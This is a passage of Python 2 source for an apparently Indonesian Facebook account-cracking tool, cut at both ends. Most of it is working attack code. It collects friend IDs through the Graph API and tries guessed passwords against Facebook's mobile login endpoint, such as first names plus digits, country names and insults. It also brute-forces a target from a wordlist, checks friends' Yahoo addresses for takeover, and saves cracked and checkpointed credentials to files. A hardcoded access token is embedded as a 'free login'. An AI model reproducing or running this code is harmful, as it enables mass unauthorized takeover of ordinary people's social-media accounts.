		id = w['id']
		name = w['name']
		links = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
		z = json.loads(links.text)
		try:
			mail = z['email']
			yahoo = re.compile(r'@.*')
			otw = yahoo.search(mail).group()
			if 'yahoo.com' in otw:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html = True
				br.select_form(nr=0)
				br["username"] = mail
				klik = br.submit().read()
				jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
				try:
					pek = jok.search(klik).group()
				except:
					continue
				if '"messages.ERROR_INVALID_USERNAME">' in pek:
					print("\033[1;96m[✓] \033[1;92mVULN")
					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+name)
					save = open('out/GrupMailVuln.txt','a')
					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
					save.close()
					oks.append(mail)
		except KeyError:
			pass
	print 42*"\033[1;97m="
	print '\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mSelesai ....'
	print"\033[1;97m☆ Total : \033[1;92m"+str(len(oks))
	print"\033[1;93m[+] \033[1;92mFile \033[1;91m:\033[1;97m out/GrupMailVuln.txt"
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	crack()
			
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Salah'
        os.system('rm -rf login.txt')
        time.sleep(0.001)
        login()
    else:
        os.system('clear')
        print logo
        try:
            email = raw_input('\x1b[1;97m»» \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
            passw = raw_input('\x1b[1;97m»» \x1b[1;92mWordlist \x1b[1;97m(tulis👉target.txt) \x1b[1;97m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mTarget :\x1b[1;97m ' + email
            time.sleep(0.05)
            print '\x1b[1;97m»» Total\x1b[1;92m ' + str(len(total)) + ' \x1b[1;91mPassword'
            time.sleep(0.05)
            jalan('\x1b[1;97m[\xe2\x9c\xba] \x1b[1;97mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;97m\xe2\x9c\xb8\x1b[1;97m] \x1b[1;92mTry \x1b[1;92m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' »» ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;97m»» \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;97mUsername \x1b[1;97m:\x1b[1;92m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;97m:\x1b[1;91m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m»» \x1b[1;92mFounded.'
                            print '\x1b[1;91m[!] \x1b[1;93mAkun Anda Checkpoint'
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;97m:\x1b[1;92m ' + email
                            time.sleep(0.05)
                            print '\x1b[1;97m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;97m:\x1b[1;92m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Koneksi Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;97mGanti List Baru"""
            super()

def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;96m EAAAAUaZA8jlABAFpDXx3FwAnUMnKBSR7hoNeO0XK0qSocPc0dxfrP0L13QVa0yXMaWKNzx8M5ZC6Ajpq50uSkfNpSHlX8kDUonlLXWFuP32hbPWjPLyoZAjZC4wKKnDTcYKHm7YsuHd7PJYzfrCZCb373OVWXeX16Vv50fFwdSiO7RZA1L152EBsXz5mgDZBvIZD  \033[1;95m👈 With out fb ID free login Token Paste & Enter👉")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Salah"
		e = raw_input("\033[1;91m[?] \033[1;92mIngin Menggunakan Token?\033[1;97m[y/n]: ")
		if e =="":
			keluar()
		elif e =="y":
			login()
		else:
			keluar()

def get(data):
	print '[*] Generate access token '

	try:
		os.mkdir('cookie')
	except OSError:
		pass

	b = open('cookie/token.log','w')
	try:
		r = requests.get('https://api.facebook.com/restserver.php',params=data)
		a = json.loads(r.text)

		b.write(a['access_token'])
		b.close()
		print '[*] Berhasil generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Gagal to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Gagal to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_phone()

def pilih_phone():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_phone()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			phone()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_phone()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Malaysia v2...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = 'anjing'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = 'bangsat'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = 'bajingan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = 'kontol'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'qw3rty'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'doraemon'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'pokemon'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
          
def mail():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_mail()

def pilih_mail():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_mail()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			mail()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_mail()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Thailand...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'thailand'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '111'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'thailand123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
          
def isi():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_isi()

def pilih_isi():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_isi()
	elif peak =="1":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			isi()
		print"\033[1;97mMencari ID\033[1;97m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_isi()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Philipines...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
			
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass #Do_Dhe_Les
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;92m[✓] ' + user + ' | ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;93m[+] ' + user + ' | ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92m[✓] ' + user + ' | ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;93m[+] ' + user + ' | ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name']+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[✓] ' + user + ' | ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;93m[+] ' + user + ' | ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '12345'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92m[✓] ' + user + ' | ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;93m[+] ' + user + ' | ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = 'malamig'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92m[✓] ' + user + ' | ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;93m[+] ' + user + ' | ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + b['last_name']
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92m[✓] ' + user + ' | ' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;93m[+] ' + user + ' | ' + pass6
															cek = open("out/checkpoint.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															cekpoint.append(user+pass6)
														else:
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = 'philippines'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92m[✓] ' + user + ' | ' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;93m[+] ' + user + ' | ' + pass7
																	cek = open("out/checkpoint.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	cekpoint.append(user+pass7)
																	
															
		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m="
	print '\033[1;92m✓Selesai....'
	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	raw_input("\n\033[1;97m[\033[1;91mKembali\033[1;97m]")
	crack()
          
def army():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken Salah"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m»»1.Crack Publik ID."
        time.sleep(0.05)
	print "\033[1;91m»»0.Kembali"
	pilih_army()

def pilih_army():
	peak = raw_input("\n\033[1;97mPilih Tools>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mPilih yang benar"
		pilih_army()
	elif peak =="1":
		os.system('clear')
		print logo
		jjj = raw_input("\033[1;97m»»Masukan ID\033[1;97m: \033[1;97m")
		try:
			gg = requests.get("https://graph.facebook.com/"+jjj+"?access_token="+toket)
			hh = json.loads(gg.text)
			print"\033[1;97mNama:\033[1;92m "+td["name"]
		except KeyError:
			print"\x1b[1;91mID Salah!"
			raw_input("\n\033[1;91m[\033[1;97mKembali\033[1;91m]")
			army()
		print"\033[1;97mMencari ID\033[1;97m..."
		d = requests.get("https://graph.facebook.com/"+jjj+"/friends?access_token="+toket)
		e = json.loads(d.text)
		for t in e['data']:
			id.append(t['id'])
	elif peak =="0":
		crack()
	else:
		print "\x1b[1;91mPilih Yang Benar"
		pilih_army()
	
	print "\033[1;97m»» Total ID : \033[1;92m"+str(len(id))
	jalan('\033[1;97m»» mStart Crack Indonesia v2...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m»»Crack \033[1;91m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;91m»»Stop CTRL+z')
	print 42*"\033[1;97m="
	
	def main(arg):
		user = arg
		try:
